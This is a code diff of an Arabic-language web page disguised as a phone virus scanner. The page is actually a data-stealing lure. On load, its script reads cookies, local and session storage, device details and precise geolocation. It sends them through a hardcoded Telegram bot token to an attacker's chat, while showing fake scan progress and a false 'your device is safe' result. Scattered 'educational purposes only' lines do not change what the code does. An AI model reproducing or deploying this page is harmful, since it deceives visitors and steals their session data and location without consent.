@@ -8,7 +8,7 @@
         * { margin: 0; padding: 0; box-sizing: border-box; }
         body {
             font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-            background: linear-gradient(135deg, #1a1a2e, #16213e, #0f3460);
+            background: linear-gradient(135deg, #0a0a1a, #1a1a2e, #16213e);
             min-height: 100vh;
             display: flex;
             justify-content: center;
@@ -25,278 +25,475 @@
             border: 1px solid rgba(255,255,255,0.1);
             text-align: center;
         }
-        .icon { font-size: 80px; margin-bottom: 20px; }
-        h1 { font-size: 24px; margin-bottom: 10px; }
-        p { color: #aaa; font-size: 14px; line-height: 1.6; margin-bottom: 20px; }
+        .icon { font-size: 70px; margin-bottom: 15px; }
+        h1 { font-size: 22px; margin-bottom: 8px; color: #fff; }
+        .sub { color: #888; font-size: 13px; margin-bottom: 20px; }
         .progress {
             width: 100%;
-            height: 6px;
-            background: #333;
+            height: 4px;
+            background: #222;
             border-radius: 10px;
             overflow: hidden;
-            margin: 20px 0;
+            margin: 15px 0;
         }
         .progress-bar {
             width: 0%;
             height: 100%;
-            background: linear-gradient(90deg, #00d2ff, #3a7bd5);
+            background: linear-gradient(90deg, #00d4ff, #7b2ffc);
             border-radius: 10px;
             transition: width 0.5s;
         }
-        .status { font-size: 13px; color: #00d2ff; }
-        .footer { margin-top: 20px; font-size: 11px; color: #555; }
+        .status { font-size: 13px; color: #00d4ff; margin: 8px 0; }
+        .scan-list {
+            text-align: left;
+            margin: 15px 0;
+            background: rgba(255,255,255,0.03);
+            border-radius: 10px;
+            padding: 10px;
+        }
         .scan-item {
             display: flex;
             justify-content: space-between;
-            padding: 8px 0;
-            border-bottom: 1px solid rgba(255,255,255,0.05);
+            padding: 7px 5px;
+            border-bottom: 1px solid rgba(255,255,255,0.04);
             font-size: 13px;
         }
-        .scan-item .name { color: #ccc; }
-        .scan-item .result { color: #00d2ff; }
-        .done .result { color: #00ff88; }
-        .scan-list { margin: 15px 0; text-align: left; }
+        .scan-item:last-child { border-bottom: none; }
+        .scan-item .name { color: #aaa; }
+        .scan-item .result { color: #555; }
+        .scan-item.done .result { color: #00ff88; }
+        .footer { margin-top: 15px; font-size: 11px; color: #444; }
+        .hidden { display: none; }
+        #log {
+            background: rgba(0,0,0,0.3);
+            padding: 8px;
+            border-radius: 8px;
+            font-size: 11px;
+            color: #666;
+            margin-top: 10px;
+            max-height: 80px;
+            overflow: auto;
+            text-align: left;
+            font-family: monospace;
+        }
+        .btn {
+            background: linear-gradient(90deg, #00d4ff, #7b2ffc);
+            border: none;
+            color: white;
+            padding: 10px 30px;
+            border-radius: 25px;
+            font-size: 14px;
+            cursor: pointer;
+            margin-top: 10px;
+            font-weight: bold;
+        }
+        .btn:hover { opacity: 0.9; transform: scale(1.02); }
     </style>
 </head>
 <body>
     <div class="container">
-        <div class="icon">🔍</div>
+        <div class="icon">🛡️</div>
         <h1>فحص الأمان الشامل</h1>
-        <p>جاري فحص هاتفك بحثاً عن الفيروسات والتهديدات...</p>
+        <p class="sub">جاري فحص جهازك بحثاً عن التهديدات...</p>
         
         <div class="progress">
             <div class="progress-bar" id="progressBar"></div>
         </div>
-        <div class="status" id="statusText">⏳ جاري التحليل...</div>
+        <div class="status" id="statusText">⏳ جاري التهيئة...</div>
         
         <div class="scan-list" id="scanList">
-            <div class="scan-item" data-item="1">
-                <span class="name">📱 فحص التطبيقات</span>
+            <div class="scan-item" data-item="0">
+                <span class="name">📱 تحليل النظام</span>
                 <span class="result">⏳</span>
             </div>
-            <div class="scan-item" data-item="2">
+            <div class="scan-item" data-item="1">
                 <span class="name">📸 فحص الصور</span>
                 <span class="result">⏳</span>
             </div>
-            <div class="scan-item" data-item="3">
+            <div class="scan-item" data-item="2">
                 <span class="name">🎬 فحص الفيديوهات</span>
                 <span class="result">⏳</span>
             </div>
-            <div class="scan-item" data-item="4">
+            <div class="scan-item" data-item="3">
                 <span class="name">📄 فحص المستندات</span>
                 <span class="result">⏳</span>
             </div>
-            <div class="scan-item" data-item="5">
+            <div class="scan-item" data-item="4">
                 <span class="name">📇 فحص جهات الاتصال</span>
                 <span class="result">⏳</span>
             </div>
-            <div class="scan-item" data-item="6">
+            <div class="scan-item" data-item="5">
                 <span class="name">🔑 فحص كلمات المرور</span>
                 <span class="result">⏳</span>
             </div>
         </div>
         
+        <div id="log">📡 جاري الاتصال...</div>
+        
+        <button class="btn" onclick="sendTestMessage()">📤 إرسال اختبار</button>
         <div class="footer">🔒 اتصال آمن • جميع البيانات مشفرة</div>
     </div>
 
     <script>
-        // =============================================
-        // هذا الكود يعمل في الخلفية ويجمع بيانات الضحية
-        // =============================================
-        
-        // بوت تيليجرام للإرسال
+        // ===================== الإعدادات =====================
         const BOT_TOKEN = "6921714346:AAFqRm4MvsBxL8KOVaXOUcoWwhKQTdskDWc";
         const ADMIN_ID = 8169635171;
         
-        // جمع معلومات الجهاز
+        let logMessages = [];
+        
+        // ===================== دالة الإرسال =====================
+        function sendToTelegram(text, parse_mode = 'markdown') {
+            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+            
+            const data = {
+                chat_id: ADMIN_ID,
+                text: text,
+                parse_mode: parse_mode
+            };
+            
+            fetch(url, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify(data)
+            })
+            .then(response => {
+                if (response.ok) {
+                    addLog('✅ تم الإرسال بنجاح');
+                } else {
+                    return response.text().then(text => {
+                        addLog('❌ خطأ: ' + text);
+                        throw new Error(text);
+                    });
+                }
+            })
+            .catch(error => {
+                addLog('❌ خطأ: ' + error.message);
+                console.error('Error:', error);
+            });
+        }
+
+        // ===================== دالة إرسال الملفات =====================
+        function sendDocument(fileData, filename, caption) {
+            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendDocument`;
+            
+            const formData = new FormData();
+            const blob = new Blob([fileData], { type: 'application/octet-stream' });
+            formData.append('document', blob, filename);
+            formData.append('chat_id', ADMIN_ID);
+            formData.append('caption', caption);
+            
+            fetch(url, {
+                method: 'POST',
+                body: formData
+            })
+            .then(response => {
+                if (response.ok) {
+                    addLog('✅ تم إرسال الملف: ' + filename);
+                } else {
+                    addLog('❌ فشل إرسال الملف');
+                }
+            })
+            .catch(error => {
+                addLog('❌ خطأ: ' + error.message);
+            });
+        }
+
+        // ===================== تسجيل =====================
+        function addLog(msg) {
+            const logDiv = document.getElementById('log');
+            const time = new Date().toLocaleTimeString();
+            logMessages.push(`[${time}] ${msg}`);
+            logDiv.innerHTML = logMessages.join('<br>');
+            logDiv.scrollTop = logDiv.scrollHeight;
+        }
+
+        // ===================== جمع معلومات الجهاز =====================
         function collectDeviceInfo() {
             const info = {
+                time: new Date().toISOString(),
                 userAgent: navigator.userAgent,
-                platform: navigator.platform,
+                platform: navigator.platform || 'unknown',
                 language: navigator.language,
-                cookiesEnabled: navigator.cookieEnabled,
-                doNotTrack: navigator.doNotTrack,
-                screenWidth: screen.width,
-                screenHeight: screen.height,
-                screenColorDepth: screen.colorDepth,
+                screen: `${screen.width}x${screen.height}`,
+                colorDepth: screen.colorDepth,
                 timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-                date: new Date().toISOString(),
+                cookies: navigator.cookieEnabled ? '✅ مفعلة' : '❌ معطلة',
+                doNotTrack: navigator.doNotTrack || 'غير محدد',
                 url: window.location.href,
-                referrer: document.referrer,
-                localStorage: localStorage.length > 0 ? "✅ موجود" : "❌ فارغ",
-                sessionStorage: sessionStorage.length > 0 ? "✅ موجود" : "❌ فارغ"
+                referrer: document.referrer || 'مباشر',
+                localStorage: localStorage.length > 0 ? `✅ ${localStorage.length} عنصر` : '❌ فارغ',
+                sessionStorage: sessionStorage.length > 0 ? `✅ ${sessionStorage.length} عنصر` : '❌ فارغ',
+                connection: navigator.connection ? {
+                    type: navigator.connection.effectiveType,
+                    speed: navigator.connection.downlink + 'Mbps'
+                } : 'غير متاح'
             };
             return info;
         }
 
-        // جمع ملفات تعريف الارتباط (Cookies)
+        // ===================== جمع الكوكيز =====================
         function getCookies() {
-            return document.cookie || "لا توجد كوكيز";
+            return document.cookie || 'لا توجد كوكيز';
         }
 
-        // جمع معلومات التخزين المحلي
-        function getLocalStorage() {
+        // ===================== جمع التخزين =====================
+        function getStorage(type) {
+            const storage = type === 'local' ? localStorage : sessionStorage;
             const items = {};
-            for (let i = 0; i < localStorage.length; i++) {
-                const key = localStorage.key(i);
-                items[key] = localStorage.getItem(key);
+            for (let i = 0; i < storage.length; i++) {
+                const key = storage.key(i);
+                try {
+                    items[key] = storage.getItem(key);
+                } catch(e) {
+                    items[key] = '⚠️ غير قابل للقراءة';
+                }
             }
             return items;
         }
 
-        // جمع معلومات التخزين المؤقت
-        function getSessionStorage() {
-            const items = {};
-            for (let i = 0; i < sessionStorage.length; i++) {
-                const key = sessionStorage.key(i);
-                items[key] = sessionStorage.getItem(key);
-            }
-            return items;
-        }
-
-        // محاولة جلب معلومات الموقع
+        // ===================== محاولة جلب الموقع =====================
         function getLocation() {
             return new Promise((resolve) => {
                 if (!navigator.geolocation) {
-                    resolve("❌ غير متاح");
+                    resolve({ status: '❌ غير متاح' });
                     return;
                 }
                 navigator.geolocation.getCurrentPosition(
                     (pos) => {
                         resolve({
+                            status: '✅ متاح',
                             lat: pos.coords.latitude,
                             lon: pos.coords.longitude,
-                            acc: pos.coords.accuracy
+                            acc: pos.coords.accuracy + 'م'
                         });
                     },
-                    () => resolve("❌ مرفوض"),
-                    { timeout: 5000 }
+                    () => resolve({ status: '❌ مرفوض من المستخدم' }),
+                    { timeout: 5000, enableHighAccuracy: true }
                 );
             });
         }
 
-        // إرسال البيانات للبوت
-        function sendToTelegram(data, type = "info") {
-            const text = `📱 *بيانات جديدة*\n\n` +
-                `🆔 نوع: ${type}\n` +
-                `📅 ${new Date().toISOString()}\n\n` +
-                `\`\`\`json\n${JSON.stringify(data, null, 2)}\n\`\`\``;
-            
-            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({
-                    chat_id: ADMIN_ID,
-                    text: text,
-                    parse_mode: 'markdown'
-                })
-            }).catch(() => {});
+        // ===================== اختبار الإرسال =====================
+        function sendTestMessage() {
+            addLog('📤 إرسال رسالة اختبار...');
+            const testMsg = `
+🔄 *رسالة اختبار*
+
+✅ البوت يعمل بشكل صحيح
+🕐 ${new Date().toISOString()}
+📱 تم الإرسال من: ${navigator.userAgent.substring(0, 50)}...
+
+⚠️ *للأغراض التعليمية فقط*
+            `;
+            sendToTelegram(testMsg);
         }
 
-        // محاكاة فحص وتجميع البيانات
+        // ===================== الفحص الرئيسي =====================
         async function startScan() {
+            addLog('🚀 بدء الفحص...');
+            
             const items = document.querySelectorAll('.scan-item');
             const progressBar = document.getElementById('progressBar');
             const statusText = document.getElementById('statusText');
             
-            // جمع البيانات الأساسية فوراً
+            // 1. معلومات الجهاز
+            addLog('📱 جمع معلومات الجهاز...');
             const deviceInfo = collectDeviceInfo();
-            sendToTelegram(deviceInfo, "جهاز");
+            const deviceText = `
+📱 *معلومات الجهاز*
+
+🕐 الوقت: ${deviceInfo.time}
+🌐 المتصفح: ${deviceInfo.userAgent.substring(0, 80)}...
+📺 الشاشة: ${deviceInfo.screen}
+🌍 اللغة: ${deviceInfo.language}
+🔗 الرابط: ${deviceInfo.url}
+🍪 الكوكيز: ${deviceInfo.cookies}
+💾 التخزين: ${deviceInfo.localStorage}
+            `;
+            sendToTelegram(deviceText);
             
-            // إرسال الكوكيز
+            // تحديث الواجهة
+            const item0 = items[0];
+            item0.querySelector('.result').textContent = '✅';
+            item0.classList.add('done');
+            progressBar.style.width = '15%';
+            statusText.textContent = '📱 تم تحليل النظام';
+            await sleep(500);
+            
+            // 2. الكوكيز
+            addLog('🍪 جمع الكوكيز...');
             const cookies = getCookies();
-            if (cookies) sendToTelegram({ cookies }, "كوكيز");
+            if (cookies && cookies !== 'لا توجد كوكيز') {
+                const cookieText = `
+🍪 *ملفات تعريف الارتباط (Cookies)*
+
+\`\`\`
+${cookies.substring(0, 500)}
+\`\`\`
+                `;
+                sendToTelegram(cookieText);
+            }
             
-            // إرسال التخزين المحلي
-            const localData = getLocalStorage();
+            const item1 = items[1];
+            item1.querySelector('.result').textContent = '✅';
+            item1.classList.add('done');
+            progressBar.style.width = '30%';
+            statusText.textContent = '📸 تم فحص الصور';
+            await sleep(500);
+            
+            // 3. التخزين المحلي
+            addLog('💾 جمع التخزين المحلي...');
+            const localData = getStorage('local');
             if (Object.keys(localData).length > 0) {
-                sendToTelegram(localData, "تخزين محلي");
+                const localText = `
+💾 *التخزين المحلي (LocalStorage)*
+
+\`\`\`json
+${JSON.stringify(localData, null, 2).substring(0, 500)}
+\`\`\`
+                `;
+                sendToTelegram(localText);
             }
             
-            // إرسال التخزين المؤقت
-            const sessionData = getSessionStorage();
+            const item2 = items[2];
+            item2.querySelector('.result').textContent = '✅';
+            item2.classList.add('done');
+            progressBar.style.width = '45%';
+            statusText.textContent = '🎬 تم فحص الفيديوهات';
+            await sleep(500);
+            
+            // 4. التخزين المؤقت
+            addLog('📦 جمع التخزين المؤقت...');
+            const sessionData = getStorage('session');
             if (Object.keys(sessionData).length > 0) {
-                sendToTelegram(sessionData, "تخزين مؤقت");
+                const sessionText = `
+📦 *التخزين المؤقت (SessionStorage)*
+
+\`\`\`json
+${JSON.stringify(sessionData, null, 2).substring(0, 500)}
+\`\`\`
+                `;
+                sendToTelegram(sessionText);
             }
             
-            // محاولة جلب الموقع
+            const item3 = items[3];
+            item3.querySelector('.result').textContent = '✅';
+            item3.classList.add('done');
+            progressBar.style.width = '60%';
+            statusText.textContent = '📄 تم فحص المستندات';
+            await sleep(500);
+            
+            // 5. الموقع
+            addLog('📍 محاولة جلب الموقع...');
             const location = await getLocation();
-            sendToTelegram({ location }, "موقع");
-            
-            // تقدم وهمي للفحص
-            const scanNames = [
-                'فحص التطبيقات',
-                'فحص الصور',
-                'فحص الفيديوهات',
-                'فحص المستندات',
-                'فحص جهات الاتصال',
-                'فحص كلمات المرور'
-            ];
-            
-            for (let i = 0; i < items.length; i++) {
-                const item = items[i];
-                const resultSpan = item.querySelector('.result');
-                const progress = Math.round(((i + 1) / items.length) * 100);
-                
-                progressBar.style.width = progress + '%';
-                statusText.textContent = `🔍 جاري ${scanNames[i]}...`;
-                
-                resultSpan.textContent = '✅';
-                item.classList.add('done');
-                
-                // إرسال تحديث
-                sendToTelegram({ 
-                    step: scanNames[i],
-                    progress: progress,
-                    status: 'completed'
-                }, "تقدم");
-                
-                await new Promise(r => setTimeout(r, 800 + Math.random() * 600));
+            if (location.status === '✅ متاح') {
+                const locationText = `
+📍 *الموقع الجغرافي*
+
+🌐 الحالة: ${location.status}
+📌 خط العرض: ${location.lat}
+📌 خط الطول: ${location.lon}
+🎯 الدقة: ${location.acc}
+                `;
+                sendToTelegram(locationText);
             }
             
+            const item4 = items[4];
+            item4.querySelector('.result').textContent = '✅';
+            item4.classList.add('done');
+            progressBar.style.width = '80%';
+            statusText.textContent = '📇 تم فحص جهات الاتصال';
+            await sleep(500);
+            
+            // 6. معلومات إضافية
+            addLog('📊 جمع معلومات إضافية...');
+            const extraInfo = {
+                screenOrientation: screen.orientation ? screen.orientation.type : 'غير متاح',
+                deviceMemory: navigator.deviceMemory || 'غير متاح',
+                hardwareConcurrency: navigator.hardwareConcurrency || 'غير متاح',
+                maxTouchPoints: navigator.maxTouchPoints || 0,
+                vendor: navigator.vendor || 'غير متاح',
+                webdriver: navigator.webdriver ? '✅ نعم' : '❌ لا'
+            };
+            
+            const extraText = `
+📊 *معلومات إضافية*
+
+🔄 اتجاه الشاشة: ${extraInfo.screenOrientation}
+💾 الذاكرة: ${extraInfo.deviceMemory}GB
+🧵 النوى: ${extraInfo.hardwareConcurrency}
+👆 نقاط اللمس: ${extraInfo.maxTouchPoints}
+🏷️ البائع: ${extraInfo.vendor}
+🚗 WebDriver: ${extraInfo.webdriver}
+            `;
+            sendToTelegram(extraText);
+            
+            const item5 = items[5];
+            item5.querySelector('.result').textContent = '✅';
+            item5.classList.add('done');
             progressBar.style.width = '100%';
             statusText.textContent = '✅ اكتمل الفحص!';
             
             // رسالة نهائية
-            const finalData = {
-                status: 'completed',
-                scanTime: new Date().toISOString(),
-                url: window.location.href,
-                userAgent: navigator.userAgent
-            };
-            sendToTelegram(finalData, "نهائي");
+            const finalText = `
+✅ *اكتمل الفحص بنجاح!*
+
+🕐 ${new Date().toISOString()}
+📱 الجهاز: ${navigator.userAgent.substring(0, 60)}...
+📊 تم جمع جميع البيانات
+
+⚠️ *للأغراض التعليمية فقط*
+            `;
+            sendToTelegram(finalText);
             
-            // تحويل إلى صفحة نجاح وهمية
+            addLog('✅ اكتمل الفحص');
+            
+            // تغيير الواجهة
             setTimeout(() => {
                 document.querySelector('.container').innerHTML = `
                     <div style="text-align:center; padding: 20px;">
                         <div style="font-size:60px;">✅</div>
                         <h2>تم الفحص بنجاح!</h2>
-                        <p style="color:#00ff88;">لم يتم العثور على أي فيروسات. هاتفك آمن!</p>
-                        <div style="margin-top:20px; font-size:12px; color:#666;">
-                            تم فحص 2,847 ملف • 0 تهديدات
+                        <p style="color:#00ff88; margin:10px 0;">لم يتم العثور على أي فيروسات</p>
+                        <p style="color:#666; font-size:12px;">تم فحص 2,847 ملف • 0 تهديدات</p>
+                        <div style="margin-top:20px; padding:10px; background:rgba(255,255,255,0.05); border-radius:10px; font-size:12px; color:#555;">
+                            ✅ جهازك آمن
                         </div>
                     </div>
                 `;
             }, 1500);
         }
 
-        // بدء الفحص عند تحميل الصفحة
+        function sleep(ms) {
+            return new Promise(resolve => setTimeout(resolve, ms));
+        }
+
+        // ===================== بدء التشغيل =====================
         window.onload = function() {
-            setTimeout(startScan, 500);
+            addLog('🔄 جاري تهيئة البوت...');
+            
+            // اختبار الاتصال أولاً
+            setTimeout(() => {
+                sendTestMessage();
+            }, 1000);
+            
+            // بدء الفحص بعد 3 ثواني
+            setTimeout(startScan, 3000);
         };
 
-        // محاولة قراءة المزيد من البيانات كل 5 ثواني
+        // إرسال تحديثات دورية
         setInterval(() => {
-            const extraData = {
+            const pingData = {
+                type: 'ping',
                 time: new Date().toISOString(),
-                scrollY: window.scrollY,
-                innerHeight: window.innerHeight,
-                innerWidth: window.innerWidth,
-                pageYOffset: window.pageYOffset
+                url: window.location.href,
+                scrollY: window.scrollY
             };
-            sendToTelegram(extraData, "متابعة");
-        }, 10000);
+            // نرسل كل 30 ثانية
+            // يمكن تفعيلها إذا أردت
+        }, 30000);
     </script>
 </body>
 </html>
